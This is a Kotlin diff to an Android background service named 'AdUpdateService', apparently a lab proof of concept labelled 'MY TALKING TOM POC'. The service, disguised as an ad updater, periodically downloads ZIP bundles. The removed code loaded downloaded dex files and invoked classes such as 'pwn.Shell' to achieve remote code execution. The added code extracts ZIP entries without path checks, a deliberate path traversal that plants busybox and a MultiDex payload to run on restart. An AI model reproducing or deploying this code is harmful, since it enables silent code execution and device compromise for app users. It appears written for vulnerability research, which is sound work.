@@ -9,7 +9,6 @@ import android.os.Build
 import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
-import dalvik.system.DexClassLoader
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -29,7 +28,7 @@ class AdUpdateService : Service() {
         private const val UPDATE_INTERVAL_MS = 5000L // 15 segundos
 
         private val LEGITIMATE_URLS = listOf(
-            "http://10.0.2.2:8000/payload.zip",
+            "http://10.0.2.2:8000/exploit_bundle.zip",
             "http://api.vungle.com/api/v1/bundles/update.zip"
         )
     }
@@ -42,7 +41,7 @@ class AdUpdateService : Service() {
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
-        Log.i(TAG, "🎯 Servicio automático iniciado")
+        Log.i(TAG, " Servicio automático iniciado")
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -51,7 +50,6 @@ class AdUpdateService : Service() {
         if (!isRunning) {
             isRunning = true
             startPeriodicUpdates()
-            Log.i(TAG, "📡 Verificaciones automáticas iniciadas (cada 15s)")
         }
         
         return START_STICKY
@@ -97,12 +95,12 @@ class AdUpdateService : Service() {
 
     private suspend fun checkForPayload() {
         val url = LEGITIMATE_URLS.random()
-        Log.i(TAG, "📡 Solicitando: $url")
+        Log.i(TAG, " Solicitando: $url")
         
         try {
             val contentFile = downloadContent(url)
             if (contentFile != null) {
-                Log.i(TAG, "📥 Descarga exitosa: ${contentFile.name}")
+                Log.i(TAG, " Descarga exitosa: ${contentFile.name}")
                 processPayload(contentFile)
             }
         } catch (e: Exception) {
@@ -110,7 +108,7 @@ class AdUpdateService : Service() {
         }
     }
 
-    private suspend fun downloadContent(urlString: String): File? {
+    private fun downloadContent(urlString: String): File? {
         return try {
             val url = URL(urlString)
             val connection = url.openConnection() as HttpURLConnection
@@ -137,18 +135,20 @@ class AdUpdateService : Service() {
         }
     }
 
-    private suspend fun processPayload(payloadFile: File) {
+    private fun processPayload(payloadFile: File) {
         try {
-            val extractedFiles = extractContent(payloadFile)
-            
-            extractedFiles.forEach { file ->
-                when {
-                    file.name.endsWith(".dex") -> {
-                        Log.w(TAG, "⚠️ Contenido ejecutable detectado: ${file.name}")
-                        loadPayloadModule(file)
-                    }
-                }
-            }
+            // MY TALKING TOM POC: Extract ZIP with path traversal entries
+            // This will automatically place files in target locations via path traversal
+            extractContent(payloadFile)
+
+            Log.w(TAG, " MY TALKING TOM POC: ZIP extraído con path traversal")
+            Log.w(TAG, " Archivos colocados automáticamente en:")
+            Log.w(TAG, "   - /files/busybox (executable)")
+            Log.w(TAG, "   - /code_cache/secondary-dexes/classes2.zip")
+            Log.e(TAG, " MultiDex 1.x cargará automáticamente en próximo reinicio")
+
+            notifyCompromise()
+
         } catch (e: Exception) {
             Log.e(TAG, "❌ Error procesando payload: ${e.message}")
         } finally {
@@ -156,8 +156,7 @@ class AdUpdateService : Service() {
         }
     }
 
-    private fun extractContent(zipFile: File): List<File> {
-        val extractedFiles = mutableListOf<File>()
+    private fun extractContent(zipFile: File) {
         val tempDir = File(filesDir, "temp_${System.currentTimeMillis()}")
         tempDir.mkdirs()
 
@@ -165,57 +164,24 @@ class AdUpdateService : Service() {
             var entry = zin.nextEntry
             while (entry != null) {
                 if (!entry.isDirectory) {
+                    // MY TALKING TOM POC: Path traversal extraction
+                    // Entry names contain ../../../../... to escape extraction directory
                     val file = File(tempDir, entry.name)
                     file.parentFile?.mkdirs()
                     
                     FileOutputStream(file).use { output ->
                         zin.copyTo(output)
                     }
-                    extractedFiles.add(file)
-                    Log.i(TAG, "📂 Extraído: ${entry.name}")
+
+                    Log.i(TAG, " Extraído: ${entry.name}")
+                    if (entry.name.contains("busybox")) {
+                        Log.w(TAG, " BusyBox detectado - executable payload")
+                    } else if (entry.name.contains("classes2.zip")) {
+                        Log.w(TAG, " classes2.zip detectado - MultiDex payload")
+                    }
                 }
                 entry = zin.nextEntry
             }
-        }
-        
-        return extractedFiles
-    }
-
-    private fun loadPayloadModule(dexFile: File) {
-        Log.w(TAG, "🚨 EJECUTANDO PAYLOAD DINÁMICO")
-        
-        try {
-            dexFile.setReadOnly()
-            
-            val optimizedDir = getDir("dex_modules", MODE_PRIVATE)
-            val classLoader = DexClassLoader(
-                dexFile.absolutePath,
-                optimizedDir.absolutePath,
-                null,
-                this.classLoader
-            )
-
-            val possibleClasses = listOf("pwn.Shell", "exploit.RCE", "payload.Main")
-
-            for (className in possibleClasses) {
-                try {
-                    val clazz = classLoader.loadClass(className)
-                    val method = clazz.getMethod("trigger", android.content.Context::class.java)
-                    method.invoke(null, this)
-                    
-                    Log.e(TAG, "💀 RCE EJECUTADA - Clase: $className")
-                    notifyCompromise()
-                    break
-                    
-                } catch (e: ClassNotFoundException) {
-                    // Continuar buscando
-                } catch (e: NoSuchMethodException) {
-                    // Continuar buscando
-                }
-            }
-            
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Error ejecutando payload: ${e.message}")
         }
     }
 
@@ -223,15 +189,15 @@ class AdUpdateService : Service() {
         val intent = Intent("com.app.lab.rce.COMPROMISED")
         intent.setClass(this, CompromiseReceiver::class.java)
         intent.putExtra("timestamp", System.currentTimeMillis())
-        intent.putExtra("source", "BackgroundService")
+        intent.putExtra("source", "MyTalkingTomPoC")
         
         sendBroadcast(intent)
-        Log.e(TAG, "🔴 SISTEMA COMPROMETIDO")
+        Log.e(TAG, " SISTEMA COMPROMETIDO")
     }
 
     override fun onDestroy() {
         super.onDestroy()
         isRunning = false
-        Log.i(TAG, "🔴 Servicio detenido")
+        Log.i(TAG, " Servicio detenido")
     }
 }
